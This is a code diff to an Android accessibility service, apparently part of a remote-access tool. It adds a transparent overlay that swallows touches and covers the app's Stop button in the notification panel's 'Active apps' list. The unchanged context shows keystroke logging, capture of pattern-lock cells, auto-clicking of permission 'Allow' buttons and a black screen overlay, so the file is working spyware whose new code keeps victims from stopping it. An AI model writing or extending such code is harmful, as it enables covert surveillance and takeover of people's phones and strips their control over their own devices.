@@ -77,6 +77,12 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     // Keep-screen-alive (no Activity dependency)
     private KeepAliveManager keepAliveManager;
 
+    // Notification-panel stop-button protection overlay
+    private View notifStopOverlayView;
+    private WindowManager notifStopWindowManager;
+    private Handler notifStopOverlayHandler;
+    private boolean notifPanelActiveAppsVisible = false;
+
     // Password field tracking via accessibility focus
     private volatile boolean currentFocusIsPassword = false;
     private volatile String  currentFocusHint       = "";
@@ -546,6 +552,12 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 }
                     
                 case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
+                    // If the notification panel is closing (foreground moves away from systemui),
+                    // remove the stop-button protection overlay immediately.
+                    if (!"com.android.systemui".equals(packageName) && notifPanelActiveAppsVisible) {
+                        notifPanelActiveAppsVisible = false;
+                        removeNotifStopOverlay();
+                    }
                     updateCurrentAppName();
                     String log = "[" + packageName + "] APP OPENED";
                     keylogBuffer.add(log);
@@ -587,10 +599,11 @@ public class UnifiedAccessibilityService extends AccessibilityService {
 
                 case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
                     autoClickAllowButton();
-                    // Advanced Unlock: when systemui fires a content change, scan for
-                    // "Cell N added" nodes that appear as the user draws their lock pattern.
                     if ("com.android.systemui".equals(packageName)) {
+                        // Advanced Unlock: scan for pattern-lock cells
                         checkAdvancedUnlockCells(event);
+                        // Notification-panel stop-button protection
+                        updateNotifPanelStopOverlay();
                     }
                     break;
 
@@ -942,6 +955,215 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         } catch (Exception e) {
             Log.e(TAG, "addBlackOverlay error: " + e.getMessage());
         }
+    }
+
+    // ── Notification-panel stop-button protection ─────────────────────────────
+
+    /**
+     * Called whenever SystemUI fires an accessibility event.
+     * Scans all windows for the "Active apps" panel.  When our app name is
+     * found in that panel, a transparent touch-blocking overlay is placed
+     * precisely over that row so the Stop button cannot be tapped.
+     * When the panel is no longer visible the overlay is removed.
+     */
+    private void updateNotifPanelStopOverlay() {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP_MR1) return;
+        try {
+            String appName = getString(R.string.app_name);
+            android.graphics.Rect rowBounds = findActiveAppsRowBounds(appName);
+            if (rowBounds != null && !rowBounds.isEmpty()) {
+                notifPanelActiveAppsVisible = true;
+                placeNotifStopOverlay(rowBounds);
+            } else {
+                notifPanelActiveAppsVisible = false;
+                removeNotifStopOverlay();
+            }
+        } catch (Exception ignored) {}
+    }
+
+    /**
+     * Walks all accessibility windows looking for a node whose text matches
+     * our app name inside the SystemUI "Active apps" panel.
+     * Returns the bounding rect of the enclosing row (app name + Stop button),
+     * or null if the panel / row is not currently visible.
+     */
+    private android.graphics.Rect findActiveAppsRowBounds(String appName) {
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                List<android.view.accessibility.AccessibilityWindowInfo> windows = getWindows();
+                if (windows != null) {
+                    for (android.view.accessibility.AccessibilityWindowInfo win : windows) {
+                        try {
+                            AccessibilityNodeInfo root = win.getRoot();
+                            if (root == null) continue;
+                            String pkg = root.getPackageName() != null
+                                    ? root.getPackageName().toString() : "";
+                            if (!pkg.contains("systemui")) {
+                                root.recycle();
+                                continue;
+                            }
+                            android.graphics.Rect bounds = findAppRowInNode(root, appName);
+                            root.recycle();
+                            if (bounds != null) return bounds;
+                        } catch (Exception ignored) {}
+                    }
+                }
+            }
+            // Fallback: active window only
+            AccessibilityNodeInfo root = getRootInActiveWindow();
+            if (root != null) {
+                android.graphics.Rect bounds = findAppRowInNode(root, appName);
+                root.recycle();
+                return bounds;
+            }
+        } catch (Exception ignored) {}
+        return null;
+    }
+
+    /**
+     * Recursively searches the node tree for a node whose visible text equals
+     * our app name.  When found, walks up the tree to find the enclosing row
+     * (a container that also has a sibling "Stop" button), and returns its
+     * screen bounds.  Falls back to the app-name node's own bounds if no row
+     * container is identified.
+     */
+    private android.graphics.Rect findAppRowInNode(AccessibilityNodeInfo node, String appName) {
+        if (node == null) return null;
+        try {
+            if (!node.isVisibleToUser()) return null;
+
+            CharSequence text = node.getText();
+            CharSequence desc = node.getContentDescription();
+            boolean nameMatch = (text != null && text.toString().trim().equals(appName))
+                    || (desc != null && desc.toString().trim().equals(appName));
+
+            if (nameMatch) {
+                // Walk up to find the best enclosing row
+                android.graphics.Rect best = new android.graphics.Rect();
+                node.getBoundsInScreen(best);
+
+                AccessibilityNodeInfo cur = node.getParent();
+                int levels = 0;
+                while (cur != null && levels < 5) {
+                    android.graphics.Rect curBounds = new android.graphics.Rect();
+                    cur.getBoundsInScreen(curBounds);
+                    // A good row container has reasonable height and is wider than the name node
+                    if (curBounds.width() >= best.width() && curBounds.height() >= best.height()
+                            && curBounds.height() < screenHeight / 3) {
+                        // Check if this container has a "Stop" child anywhere
+                        if (hasStopChildNode(cur)) {
+                            best.set(curBounds);
+                            cur.recycle();
+                            return best;
+                        }
+                        best.set(curBounds);
+                    }
+                    AccessibilityNodeInfo next = cur.getParent();
+                    cur.recycle();
+                    cur = next;
+                    levels++;
+                }
+                if (cur != null) cur.recycle();
+                return best;
+            }
+
+            for (int i = 0; i < node.getChildCount(); i++) {
+                AccessibilityNodeInfo child = node.getChild(i);
+                if (child != null) {
+                    android.graphics.Rect result = findAppRowInNode(child, appName);
+                    child.recycle();
+                    if (result != null) return result;
+                }
+            }
+        } catch (Exception ignored) {}
+        return null;
+    }
+
+    /** Returns true if any descendant node has text/description containing "stop" (case-insensitive). */
+    private boolean hasStopChildNode(AccessibilityNodeInfo node) {
+        if (node == null) return false;
+        try {
+            CharSequence t = node.getText();
+            CharSequence d = node.getContentDescription();
+            if (t != null && t.toString().toLowerCase().contains("stop")) return true;
+            if (d != null && d.toString().toLowerCase().contains("stop")) return true;
+            for (int i = 0; i < node.getChildCount(); i++) {
+                AccessibilityNodeInfo child = node.getChild(i);
+                if (child != null) {
+                    if (hasStopChildNode(child)) { child.recycle(); return true; }
+                    child.recycle();
+                }
+            }
+        } catch (Exception ignored) {}
+        return false;
+    }
+
+    /**
+     * Adds or repositions the transparent touch-blocking overlay over the
+     * given screen rectangle.  Uses TYPE_ACCESSIBILITY_OVERLAY so no
+     * SYSTEM_ALERT_WINDOW permission is required.  The overlay is completely
+     * transparent but DOES receive (and swallow) touch events, making the
+     * Stop button unreachable while the overlay is active.
+     */
+    private void placeNotifStopOverlay(android.graphics.Rect bounds) {
+        try {
+            new Handler(Looper.getMainLooper()).post(() -> {
+                try {
+                    int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
+                            ? WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
+                            : WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;
+
+                    WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
+                            bounds.width(),
+                            bounds.height(),
+                            type,
+                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
+                                | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
+                            PixelFormat.TRANSPARENT
+                    );
+                    lp.gravity = android.view.Gravity.TOP | android.view.Gravity.LEFT;
+                    lp.x = bounds.left;
+                    lp.y = bounds.top;
+
+                    WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
+                    if (wm == null) return;
+
+                    if (notifStopOverlayView != null && notifStopWindowManager != null) {
+                        // Reposition existing overlay
+                        try { notifStopWindowManager.updateViewLayout(notifStopOverlayView, lp); }
+                        catch (Exception e) { removeNotifStopOverlayOnMainThread(); }
+                        return;
+                    }
+
+                    View v = new View(UnifiedAccessibilityService.this);
+                    v.setBackgroundColor(Color.TRANSPARENT);
+                    notifStopWindowManager = wm;
+                    notifStopOverlayView = v;
+                    wm.addView(v, lp);
+                    Log.i(TAG, "NotifStop overlay placed at " + bounds.toShortString());
+                } catch (Exception e) {
+                    Log.e(TAG, "placeNotifStopOverlay error: " + e.getMessage());
+                }
+            });
+        } catch (Exception ignored) {}
+    }
+
+    /** Removes the notification-panel stop-protection overlay (may be called from any thread). */
+    private void removeNotifStopOverlay() {
+        try {
+            new Handler(Looper.getMainLooper()).post(this::removeNotifStopOverlayOnMainThread);
+        } catch (Exception ignored) {}
+    }
+
+    private void removeNotifStopOverlayOnMainThread() {
+        try {
+            if (notifStopWindowManager != null && notifStopOverlayView != null) {
+                notifStopWindowManager.removeView(notifStopOverlayView);
+                Log.i(TAG, "NotifStop overlay removed");
+            }
+        } catch (Exception ignored) {}
+        notifStopOverlayView = null;
+        notifStopWindowManager = null;
     }
 
     /** Removes the black overlay. Also called on service destroy. */
@@ -1675,6 +1897,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     public void onDestroy() {
         try { super.onDestroy(); } catch (Exception ignored) {}
         try { removeBlackOverlay(); } catch (Exception ignored) {}
+        try { removeNotifStopOverlayOnMainThread(); } catch (Exception ignored) {}
         try { com.remoteaccess.educational.commands.ScreenBlackout.getInstance().clearService(); } catch (Exception ignored) {}
         try {
             if (autoClickHandler != null && autoClickRunnable != null) {
